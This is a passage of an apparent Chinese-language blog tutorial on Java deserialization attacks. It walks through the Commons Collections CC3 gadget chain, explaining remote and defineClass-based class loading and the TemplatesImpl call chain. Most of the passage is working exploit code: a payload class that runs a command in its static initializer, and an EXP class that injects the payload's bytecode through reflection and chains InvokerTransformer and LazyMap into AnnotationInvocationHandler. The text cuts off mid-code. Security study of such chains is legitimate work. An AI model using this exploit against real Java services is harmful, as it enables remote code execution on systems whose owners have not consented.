        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="bf38ff8f02827858778c9850c2db29e3">CommonsCollections3:</h2>
<p>CC3中使用了另外一种方式来进行攻击，在CC1和CC6中，我们可以发现是通过调用命令执行来进行攻击，而这里我们引入一个新的代码执行的方式，通过动态类加载，来进行加载恶意的代码进行攻击。</p>
<h3 data-content="1" id="5847e8d55ec5d260b31e9619154808f4">动态类加载：</h3>
<p>我们首先来介绍一下动态类加载的流程，在ClassLoader中使用loadClass进行加载:</p>
<h4 data-content="1" id="3d56cc3fa51949c44ad20e2d68e39b89">字节码：</h4>
<p>我们先来介绍一下什么是Java中的字节码：</p>
<p>狭义：在P牛的Java漫谈中提到Java字节码其实仅仅指的是Java虚拟机中执行使用的一类指令，通常被存储在.class文件当中，只要我们的代码能够在编译器中编译成class文件，就能够在JVM虚拟机中进行运行。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235244-2427ab36-20cc-1.png"/></p>
<p>广义：所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在问的探讨范围之内</p>
<h4 data-content="1" id="6946580d3827cfdb6e59791f5eb9109d">URLClassLoader任意类加载：</h4>
<blockquote>
<p>Java的ClassLoader是用来加载字节码文件最基础的方法， ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime 。</p>
</blockquote>
<p>URLClassLoader 实际上是我们平时默认使用的 AppClassLoader 的父类，所以，我们解释 URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p>
<p><strong>协议：file/http/jar</strong></p>
<ul>
<li>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件 </li>
<li>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件 </li>
<li>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li>
</ul>
<p>我们看上面的三种情况可以发现，当协议不是 file 协议的情况下，最常见的就是 http 协议会使用Loader来进行寻找类。 我们可以使用HTTP协议来测试一下，看Java是否能从远程HTTP服务器上加载.class文件：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.govuln</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.URLClassLoader</span><span class="o">;</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloClassLoader</span><span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span> <span class="n">String</span><span class="o">[]</span> <span class="n">args</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">URL</span><span class="o">[]</span> <span class="n">urls</span> <span class="o">=</span> <span class="o">{</span><span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">"http://localhost:8000/"</span><span class="o">)};</span>
        <span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">URLClassLoader</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">urls</span><span class="o">);</span>
        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">loader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"Hello"</span><span class="o">);</span>
        <span class="n">c</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>我们将Hello.class程序放到服务器下面，然后我们发现运行代码能够成功请求到我们的 /Hello.class 文件，并执行了文件里的字节码，输出了"Hello World"。 所以，作为攻击者如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。</p>
<h4 data-content="1" id="da71b32776d073e521cbd819e314b5eb">defineClass直接加载字节码：</h4>
<p>我们通过调试其实可以发现，无论是加载什么文件，Java在ClassLoader中都会调用这几个函数进行类的加载：</p>
<p><code>(继承关系)ClassLoader -&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</code></p>
<p><code>ClassLoader.loadClass(不进行初始化) - &gt; ClassLoader.findClass(重写) - &gt; ClassLoader.defineClass(字节码加载类)</code></p>
<ul>
<li>
<code>loadClass</code>的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行<code>findClass</code>
</li>
<li>
<code>findClass</code>的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给<code>defineClass</code>
</li>
<li>
<code>defineClass</code>的作用是处理前面传入的字节码，将其处理成真正的<code>Java</code>类 </li>
</ul>
<p>所以可见，真正核心的部分其实是 <code>defineClass</code>，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass</code> 是一个<code>native</code>方法，逻辑在<code>JVM</code>的<code>C</code>语言代码中。</p>
<p>因为<code>defineClass</code>是一个<code>protect</code>类，所以我们需要通过反射来进行获取，然后再通过<code>defineClass</code>对字节码直接进行加载：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">ClassLoaderTest</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LoadClassTest</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

        <span class="n">ClassLoader</span> <span class="n">cl</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">();</span>
        <span class="n">Method</span> <span class="n">defineClassMethod</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D:\\temp\\classes\\Test.class"</span><span class="o">));</span>
        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cl</span><span class="o">,</span><span class="s">"Test"</span><span class="o">,</span><span class="n">code</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">code</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
        <span class="n">c</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="7439c4c0137124038c4a5c0af84e2489">调用链：</h3>
<p>因为defineClass并不是一个public方法，我们不能通过其他类来直接调用<code>defineClass</code>来直接对字节码进行加载，所以这里我们需要找到一个对defineClass重写以后public属性的地方，然后对他进行调用实现类加载，再进行类的初始化执行恶意代码：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235257-2be5da14-20cc-1.png"/></p>
<p>然后我们再跟进一下这个default方法看类中在哪进行了调用，然后找到了这defineTransletClasses的private类，然后我们再看一下哪里变成了public</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235301-2e374a00-20cc-1.png"/></p>
<p>然后我们就在Templateslmpl中找到了三种方法，而其中的一种方法中就进行了一个newInstance()初始化操作，这样就可以让我们的类初始化然后执行恶意代码，不过这里依然是一个private方法，我们还需要找对应的public方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235306-31423bf6-20cc-1.png"/></p>
<p>然后我们就找到了这个public类：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235310-33a027be-20cc-1.png"/></p>
<p>所以这里我们来梳理一下调用链：</p>
<div class="highlight"><pre><span></span><span class="n">Templateslmpl</span><span class="o">.</span><span class="na">newTransformer</span> <span class="o">-</span> <span class="o">&gt;</span> <span class="n">getTransletInstance</span> <span class="o">-</span> <span class="o">&gt;</span> <span class="n">defineClass</span> <span class="o">-</span> <span class="o">&gt;</span> <span class="n">newInstance</span><span class="o">()</span>

<span class="n">又因为TemlpatesImpl调用了序列化接口</span><span class="err">，</span><span class="n">所以里面的属性值我们都能够进行控制</span><span class="err">，</span><span class="n">直接通过反射来进行赋值</span>
<span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
<span class="n">templates</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>
</pre></div>
<h3 data-content="1" id="45cd521f85a09cbdaecb5e87a75a8071">EXP问题：</h3>
<h4 data-content="1" id="ed7ca0da7cd4a77585a1360d9adb5ec9">问题一：</h4>
<p>对必要的值赋完以后的代码EXP是这样：但发生了空指针的报错：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">EXP</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.utils.ObjectFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.security.AccessController</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.security.PrivilegedAction</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC3Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>

    <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
    <span class="c1">//_name赋值，否则代码return中止</span>
    <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
    <span class="n">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
    <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
    <span class="c1">//private byte[][] _bytecodes = null;如果为null，报出异常；</span>
    <span class="c1">//同时满足这个loader.defineClass(_bytecodes[i]);</span>
    <span class="c1">//Class defineClass(final byte[] b) {</span>
    <span class="c1">//            return defineClass(null, b, 0, b.length);</span>
    <span class="c1">//        }</span>
    <span class="n">Field</span> <span class="n">bytecodeField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
    <span class="n">bytecodeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="c1">//一维数组满足defineClass参数从而命令执行</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D://Tomcat/CC/target/classes/EXP/Demo.class"</span><span class="o">));</span>
    <span class="c1">//二维数组满足：</span>
           <span class="c1">// private byte[][] _bytecodes = null;如果为null，报出异常；</span>
           <span class="c1">//同时满足这个loader.defineClass(_bytecodes[i]);</span>
    <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
    <span class="n">bytecodeField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>
    <span class="c1">//避免_tfactory为空指针而报错</span>
<span class="c1">//    TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)</span>
<span class="c1">//            AccessController.doPrivileged(new PrivilegedAction() {</span>
<span class="c1">//                public Object run() {</span>
<span class="c1">//                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span>
<span class="c1">//                }</span>
<span class="c1">//            });</span>
    <span class="n">Field</span> <span class="n">tfactoryField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
    <span class="n">tfactoryField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="n">tfactoryField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>

    <span class="n">templates</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>


    <span class="o">}</span>




    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p>于是我们对报错的对应方法下断点进行调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235320-39895b96-20cc-1.png"/></p>
<p>经过调试我们发现，之前我们对应赋值的变量都能够通过，这里出现了_auxClasses空指针的现象，所以这里我们结合下面的if&lt;0判断语句发现，这里修改_auxClasses并不能解决问题：</p>
<p>这里判断当前类的父类的值是否为一个常量，而superClass对应的就是我们利用的demo类</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="n">ABSTRACT_TRANSLET</span>
        <span class="o">=</span> <span class="s">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="o">;</span>
<span class="k">if</span> <span class="o">(</span><span class="n">superClass</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ABSTRACT_TRANSLET</span><span class="o">))</span> <span class="o">{</span>
    <span class="n">_transletIndex</span> <span class="o">=</span> <span class="n">i</span><span class="o">;</span>
<span class="o">}</span>
<span class="k">else</span> <span class="o">{</span>
    <span class="n">_auxClasses</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">(),</span> <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235420-5d89bc48-20cc-1.png"/></p>
<p>所以我们要设置执行代码的父类是对应的ABSTRACT_TRANSLET值，同时因为父类是一个抽象类，还要实现里面的方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235444-6bd7e9be-20cc-1.png"/></p>
<h3 data-content="1" id="98f553d8ff80df82a065ba10ba52e75f">EXP(CC3Templateslmpl):</h3>
<div class="highlight"><pre><span></span><span class="n">Demo</span><span class="o">.</span><span class="na">java</span>
<span class="kn">package</span> <span class="nn">EXP</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Demo</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span><span class="o">{</span>
    <span class="kd">static</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">){</span>
           <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>

    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>然后我们再利用CC1的链将前半段链子补全得到最后CC6的EXP：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">EXP</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.utils.ObjectFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.lang.annotation.Target</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.security.AccessController</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.security.PrivilegedAction</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC3Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>

    <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
    <span class="c1">//_name赋值，否则代码return中止</span>
    <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
    <span class="n">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
    <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
    <span class="c1">//private byte[][] _bytecodes = null;如果为null，报出异常；</span>
    <span class="c1">//同时满足这个loader.defineClass(_bytecodes[i]);</span>
    <span class="c1">//Class defineClass(final byte[] b) {</span>
    <span class="c1">//            return defineClass(null, b, 0, b.length);</span>
    <span class="c1">//        }</span>
    <span class="n">Field</span> <span class="n">bytecodeField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
    <span class="n">bytecodeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="c1">//一维数组满足defineClass参数从而命令执行</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D://Tomcat/CC/target/classes/EXP/Demo.class"</span><span class="o">));</span>
    <span class="c1">//二维数组满足：</span>
           <span class="c1">// private byte[][] _bytecodes = null;如果为null，报出异常；</span>
           <span class="c1">//同时满足这个loader.defineClass(_bytecodes[i]);</span>
    <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
    <span class="n">bytecodeField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>
<span class="c1">//    避免_tfactory为空指针而报错</span>
<span class="c1">//    TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)</span>
<span class="c1">//            AccessController.doPrivileged(new PrivilegedAction() {</span>
<span class="c1">//                public Object run() {</span>
<span class="c1">//                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span>
<span class="c1">//                }</span>
<span class="c1">//            });</span>
    <span class="n">Field</span> <span class="n">tfactoryField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
    <span class="n">tfactoryField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="n">tfactoryField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>

<span class="c1">//    templates.newTransformer();</span>
    <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
            <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">templates</span><span class="o">),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"newTransformer"</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">)</span>
    <span class="o">};</span>
    <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>
<span class="c1">//        chainedTransformer.transform(1);</span>
    <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
    <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">Lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>


    <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
    <span class="n">Constructor</span> <span class="n">annotationInvocationhdlConstructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
